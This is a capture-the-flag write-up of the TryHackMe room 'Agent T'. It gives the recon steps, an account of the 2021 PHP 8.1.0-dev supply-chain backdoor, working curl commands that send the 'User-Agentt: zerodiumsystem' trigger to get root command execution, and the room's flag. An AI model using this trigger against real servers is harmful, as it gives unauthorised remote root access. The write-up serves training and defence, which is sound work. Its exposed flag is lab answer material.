# TryHackMe — Agent T

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Tags:** Web, PHP, Backdoor, CVE  

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -T4 10.66.142.46
```

Only one port open:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
```

Key finding: the service is running **PHP 8.1.0-dev**.

### Web Enumeration

Visiting the target in a browser reveals a generic SB Admin 2 dashboard template — no login forms, no interesting endpoints. However, the HTTP response headers leak the exact PHP version:

```bash
curl http://10.66.142.46:80/ -v
```

```
< X-Powered-By: PHP/8.1.0-dev
```

This version string is the entire attack surface.

---

## Exploitation

### PHP 8.1.0-dev Backdoor (Supply Chain Compromise)

In March 2021, attackers compromised the official PHP git repository (`git.php.net`) and injected a backdoor into the PHP 8.1.0-dev source code. The malicious commits were disguised as contributions from core developers Rasmus Lerdorf and Nikita Popov.

The backdoor works as follows:

- The PHP interpreter checks every incoming HTTP request for a header named `User-Agentt` (note: **double "t"**, deliberately misspelled to avoid collision with the standard `User-Agent` header).
- If the header value starts with `zerodiumsystem`, the rest of the string is passed to `system()` and executed as a shell command.
- If it starts with `zerodiumvar_dump`, the rest is passed to `var_dump()`.

The double "t" serves as a covert channel — standard HTTP traffic, WAFs, and logging tools only inspect `User-Agent`, so the backdoor trigger goes unnoticed in normal operation.

### Getting RCE

```bash
curl -s http://10.66.142.46/ -H "User-Agentt: zerodiumsystem('id');"
```

```
uid=0(root) gid=0(root) groups=0(root)
```

We have root-level execution immediately — no privilege escalation needed.

### Capturing the Flag

```bash
curl -s http://10.66.142.46/ -H "User-Agentt: zerodiumsystem('cat /flag.txt');"
```

```
flag{4127d0530abf16d6d23973e3df8dbecb}
```

---

## Lessons Learned

1. **Always read HTTP response headers.** The `X-Powered-By` header directly revealed the vulnerable PHP version. This single header was the entire recon-to-shell pipeline.

2. **Exact version matching matters.** This backdoor exists only in PHP 8.1.0-dev — not in 8.0, not in 8.1.1, not in any stable release. Recognizing the significance of `-dev` in the version string is what makes or breaks this box.

3. **Supply chain attacks are real.** This wasn't a coding mistake or a misconfiguration — it was a deliberate backdoor planted in an official repository. The incident led the PHP project to migrate from their self-hosted `git.php.net` to GitHub entirely.

4. **Unusual header names are a red flag pattern.** The use of `User-Agentt` (double "t") is a common backdoor technique: pick a header close enough to a real one that it blends into logs but different enough that it never triggers accidentally.

---

## Tools Used

- nmap
- curl
